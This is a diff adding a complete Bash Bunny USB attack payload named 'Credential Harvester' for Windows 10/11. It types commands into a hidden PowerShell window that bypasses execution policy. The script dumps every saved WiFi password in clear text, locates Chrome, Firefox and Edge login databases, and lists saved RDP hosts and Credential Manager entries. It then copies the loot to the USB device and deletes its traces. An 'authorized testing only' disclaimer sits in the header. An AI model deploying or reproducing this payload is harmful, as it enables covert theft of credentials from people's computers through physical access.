@@ -1,0 +1,306 @@
+#!/bin/bash
+#
+# Title:         Credential Harvester
+# Description:   Collect WiFi passwords and browser credential locations
+# Author:        Jon-Eric Pienkowski ~ Pacific NW Computers
+# Version:       1.0
+# Category:      Credentials
+# Target:        Windows 10/11
+# Attackmodes:   HID, Storage
+#
+# ⚠️  WARNING: FOR AUTHORIZED TESTING ONLY
+#
+# LED Status:
+# - Magenta: Setup
+# - Yellow: Collecting WiFi
+# - Cyan: Collecting browser data
+# - Green: Complete
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+
+LOOT_DIR=/root/udisk/loot/Credentials_$(date +%Y%m%d_%H%M%S)
+mkdir -p $LOOT_DIR
+
+sleep 3
+
+LED ATTACK
+
+# ============================================
+# OPEN POWERSHELL
+# ============================================
+
+RUN WIN powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+Q DELAY 2500
+
+# ============================================
+# SETUP
+# ============================================
+
+Q STRING \$l = \$env:TEMP + '\\CredHarvest_' + (Get-Date -Format 'yyyyMMdd_HHmmss')
+Q ENTER
+Q DELAY 300
+
+Q STRING New-Item -ItemType Directory -Path \$l -Force \| Out-Null
+Q ENTER
+Q DELAY 500
+
+# ============================================
+# SYSTEM CONTEXT
+# ============================================
+
+Q STRING "Computer: \$env:COMPUTERNAME" \| Out-File "\$l\\system_info.txt"
+Q ENTER
+Q DELAY 300
+
+Q STRING "User: \$env:USERNAME" \| Out-File "\$l\\system_info.txt" -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "Domain: \$env:USERDOMAIN" \| Out-File "\$l\\system_info.txt" -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "Collection Time: \$(Get-Date)" \| Out-File "\$l\\system_info.txt" -Append
+Q ENTER
+Q DELAY 500
+
+# ============================================
+# WIFI PASSWORDS
+# ============================================
+
+Q STRING \$wifi = "\$l\\wifi_passwords.txt"
+Q ENTER
+Q DELAY 300
+
+Q STRING "=== WIFI PASSWORDS ===" \| Out-File \$wifi
+Q ENTER
+Q DELAY 300
+
+Q STRING "" \| Out-File \$wifi -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING (netsh wlan show profiles) \| Select-String 'All User Profile' \| ForEach-Object {
+Q ENTER
+Q DELAY 300
+
+Q STRING \$profile = (\$_ -split ':')[1].Trim()
+Q ENTER
+Q DELAY 300
+
+Q STRING "=" * 50 \| Out-File \$wifi -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "SSID: \$profile" \| Out-File \$wifi -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING \$details = netsh wlan show profile name="\$profile" key=clear
+Q ENTER
+Q DELAY 300
+
+Q STRING \$auth = (\$details \| Select-String "Authentication").ToString().Split(':')[1].Trim()
+Q ENTER
+Q DELAY 300
+
+Q STRING \$encryption = (\$details \| Select-String "Cipher").ToString().Split(':')[1].Trim()
+Q ENTER
+Q DELAY 300
+
+Q STRING \$key = (\$details \| Select-String "Key Content")
+Q ENTER
+Q DELAY 300
+
+Q STRING if(\$key){\$password = \$key.ToString().Split(':')[1].Trim()\; "Password: \$password" \| Out-File \$wifi -Append} else {"Password: [Not Available]" \| Out-File \$wifi -Append}
+Q ENTER
+Q DELAY 300
+
+Q STRING "Authentication: \$auth" \| Out-File \$wifi -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "Encryption: \$encryption" \| Out-File \$wifi -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "" \| Out-File \$wifi -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING }
+Q ENTER
+Q DELAY 5000
+
+# ============================================
+# BROWSER CREDENTIAL LOCATIONS
+# ============================================
+
+LED SPECIAL
+
+Q STRING \$browsers = "\$l\\browser_credential_locations.txt"
+Q ENTER
+Q DELAY 300
+
+Q STRING "=== BROWSER CREDENTIAL FILE LOCATIONS ===" \| Out-File \$browsers
+Q ENTER
+Q DELAY 300
+
+Q STRING "" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+# Chrome
+Q STRING if(Test-Path "\$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"){
+Q ENTER
+Q DELAY 300
+
+Q STRING "CHROME CREDENTIALS DATABASE:" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "\$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING \$size = (Get-Item "\$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data").Length / 1KB
+Q ENTER
+Q DELAY 500
+
+Q STRING "Size: \$([math]::Round(\$size,2)) KB" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING }
+Q ENTER
+Q DELAY 500
+
+# Firefox
+Q STRING \$firefoxProfiles = "\$env:APPDATA\\Mozilla\\Firefox\\Profiles"
+Q ENTER
+Q DELAY 300
+
+Q STRING if(Test-Path \$firefoxProfiles){
+Q ENTER
+Q DELAY 300
+
+Q STRING "FIREFOX CREDENTIALS DATABASES:" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING Get-ChildItem -Path \$firefoxProfiles -Recurse -Filter "logins.json" \| ForEach-Object {
+Q ENTER
+Q DELAY 300
+
+Q STRING \$_.FullName \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "Size: \$([math]::Round(\$_.Length/1KB,2)) KB" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING }
+Q ENTER
+Q DELAY 300
+
+Q STRING }
+Q ENTER
+Q DELAY 1000
+
+# Edge
+Q STRING if(Test-Path "\$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"){
+Q ENTER
+Q DELAY 300
+
+Q STRING "EDGE CREDENTIALS DATABASE:" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "\$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING \$size = (Get-Item "\$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data").Length / 1KB
+Q ENTER
+Q DELAY 500
+
+Q STRING "Size: \$([math]::Round(\$size,2)) KB" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING "" \| Out-File \$browsers -Append
+Q ENTER
+Q DELAY 300
+
+Q STRING }
+Q ENTER
+Q DELAY 500
+
+# ============================================
+# SAVED RDP CONNECTIONS
+# ============================================
+
+Q STRING \$rdp = "\$l\\rdp_connections.txt"
+Q ENTER
+Q DELAY 300
+
+Q STRING "=== SAVED RDP CONNECTIONS ===" \| Out-File \$rdp
+Q ENTER
+Q DELAY 300
+
+Q STRING Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*' -EA SilentlyContinue \| Select PSChildName,UsernameHint \| Out-File \$rdp -Append
+Q ENTER
+Q DELAY 1500
+
+# ============================================
+# WINDOWS CREDENTIAL MANAGER
+# ============================================
+
+Q STRING \$creds = "\$l\\credential_manager.txt"
+Q ENTER
+Q DELAY 300
+
+Q STRING "=== WINDOWS CREDENTIAL MANAGER ===" \| Out-File \$creds
+Q ENTER
+Q DELAY 300
+
+Q STRING cmdkey /list \| Out-File \$creds -Append
+Q ENTER
+Q DELAY 1500
+
+# ============================================
+# COPY TO BASH BUNNY
+# ============================================
+
+Q STRING \$bb = (Get-Volume \| Where-Object {(\$_.FileSystemLabel -like '*BASHBUNNY*') -or (\$_.FileSystemLabel -eq 'BB')} \| Select-Object -First 1).DriveLetter
+Q ENTER
+Q DELAY 1000
+
+Q STRING if(\$bb){Copy-Item -Path \$l -Destination "\$bb`:\\loot\\" -Recurse -Force}
+Q ENTER
+Q DELAY 5000
+
+# ============================================
+# CLEANUP
+# ============================================
+
+Q STRING Remove-Item -Path \$l -Recurse -Force -EA SilentlyContinue
+Q ENTER
+Q DELAY 1000
+
+Q STRING exit
+Q ENTER
+
+LED FINISH
+sync
